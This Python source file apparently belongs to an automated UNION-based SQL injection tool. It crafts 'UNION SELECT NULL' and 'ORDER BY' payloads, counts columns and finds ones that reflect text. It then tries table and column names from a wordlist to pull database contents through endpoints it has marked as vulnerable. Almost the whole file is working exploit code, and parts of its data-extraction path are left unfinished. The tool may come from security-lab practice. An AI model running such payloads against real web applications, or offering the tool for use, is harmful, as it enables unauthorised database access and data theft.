import json
import random
import requests
import string

from bs4 import BeautifulSoup

from utils.auxiliary import *
from utils.files import *


log = Auxiliary(__name__)
log.set_config()


def craft_exfil_pld(table, column, options: list):
    db_comment, num_cols, str_index = options[1], options[2], options[3]
    # Defining the beginning of the payload
    pld = "' UNION SELECT"
    # Traversing all columns and looking for indexes that can contain string
    for index in range(1, int(num_cols) + 1):
        # Determine the column value based on whether it's the first index and if it can handle strings
        column_value = column if (index == 1) else "NULL" if (str_index[index - 1] != index) else None
        # Add appropriate values to the payload, avoiding repetition by using conditional expressions
        pld += f", {column_value}" if column_value is not None else ", NULL"
    pld += f" FROM {table}{db_comment}"
    return pld


def verify_table_column(url, table, column, options: list):
    exists = False
    vuln_endpoints = options[0]
    pld = craft_exfil_pld(table, column, options)
    print(f"Payload = {pld}")
    for endp in vuln_endpoints:
        pld = requests.utils.quote(pld)
        r = requests.get(url=url + endp + pld)
        log.logger.info(f"{BLUE}[*]{RESET} Trying to verify whether column +{column}+ "
                        f"exists in table +{table}+ on endpoint {url + endp + pld}")
        if r.status_code == 200:
            log.logger.info(f"{GREEN}[+]{RESET} Column +{column}+ "
                            f"exists in table +{table}+, appending it")
            exists = True
    return exists


def guess_table_columns(url, options: list):
    vuln_endpoints, db_comment, num_cols, str_index = options[0], options[1], \
        options[2], options[3]
    valid_table_column = [[], []]
    tables_json = File("tables.json")
    data = json.load(tables_json.file)
    # We are checking whether tables and columns from tables.json are valid
    for table in data:
        for column in data[table]:
            if verify_table_column(url, table, column, options):
                if table not in valid_table_column[0]:
                    valid_table_column[0].append(table)
                valid_table_column[1].append(column)


def try_data_exfil(url, options: list):
    num_cols = options[2]
    if num_cols == 1:
        pass
        # try_concat()
    else:
        guess_table_columns(url, options)


def swap_null_w_str(pld, text_str, index, options: list):
    db_comment, num_cols = options[1], options[2]
    # Stripping NULL and db_comment , adding our text string
    size_to_strip = -(4 + len(db_comment))
    str_pld = f"{pld[:size_to_strip]}'{text_str}'" + \
        ", NULL" * (num_cols - index) + db_comment
    return str_pld


def find_string_to_reflect(url):
    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    text_str = soup.find(id="hint")
    if text_str:
        text_str = text_str.string.split(': ')[1]
        # Stripping character '
        text_str = text_str[1:-1]
    else:
        # Generating a custom string
        text_str = ''.join(random.choices(
            string.ascii_letters + string.digits, k=15))
    return text_str


def find_text_cols(url, options: list):
    vuln_endpoints, db_comment, num_cols = options[0], options[1], options[2]
    text_str = find_string_to_reflect(url)
    for endp in vuln_endpoints:
        # It is easier to start from index 1
        for index in range(1, int(num_cols) + 1):
            pld = generate_null_pld(db_comment, index)
            pld = swap_null_w_str(pld, text_str, index, options)
            pld = requests.utils.quote(pld)
            r = requests.get(url=url + endp + pld)
            log.logger.info(f"{BLUE}[*]{RESET} Trying to find columns "
                            "containing the text on endpoint "
                            f"{url + endp + pld}")
            if r.status_code == 200 and text_str in r.text:
                log.logger.info(f"{GREEN}[+]{RESET} Column {index} "
                                "contains text, appending it to list")
                options[3].append(index)


def try_order_by_sqli(url, options: list):
    vuln_endpoints, db_comment = options[0], options[1]
    for endp in vuln_endpoints:
        for index in range(1, 25):
            pld = "' ORDER BY " + str(index) + db_comment
            pld = requests.utils.quote(pld)
            r = requests.get(url=url + endp + pld)
            log.logger.info(f"{BLUE}[*]{RESET} Trying union SQLi "
                            f"on endpoint {url + endp + pld}")
            if r.status_code == 500:
                log.logger.info(f"{GREEN}[+]{RESET} Confirmed union SQLi "
                                f"on endpoint {url + endp + pld}")
                log.logger.info(f"{BLUE}[*]{RESET} Number of columns "
                                f"returned is {index - 1}")
                return index - 1


def generate_null_pld(db_comment, index):
    base_pld = "' UNION SELECT NULL"
    # If we have first payload return it
    if index == 1:
        return base_pld + db_comment
    # Otherwise we add NULLs
    nulls = ", NULL" * (index - 1)
    base_pld += nulls + db_comment
    return base_pld


def try_null_sqli(url, options: list):
    vuln_endpoints, db_comment = options[0], options[1]
    for endp in vuln_endpoints:
        for index in range(0, 25):
            pld = generate_null_pld(db_comment, index)
            pld = requests.utils.quote(pld)
            r = requests.get(url=url + endp + pld)
            log.logger.info(f"{BLUE}[*]{RESET} Trying union SQLi "
                            f"on endpoint {url + endp + pld}")
            if r.status_code == 200:
                log.logger.info(f"{GREEN}[+]{RESET} Confirmed union SQLi "
                                f"on endpoint {url + endp + pld}")
                log.logger.info(f"{BLUE}[*]{RESET} Number of columns "
                                f"returned is {index}")
                return index


def try_union_sqli(url, options: list):
    options[2] = try_null_sqli(url, options)
    if not options[2]:
        options[2] = try_order_by_sqli(url, options)
    find_text_cols(url, options)
    try_data_exfil(url, options)
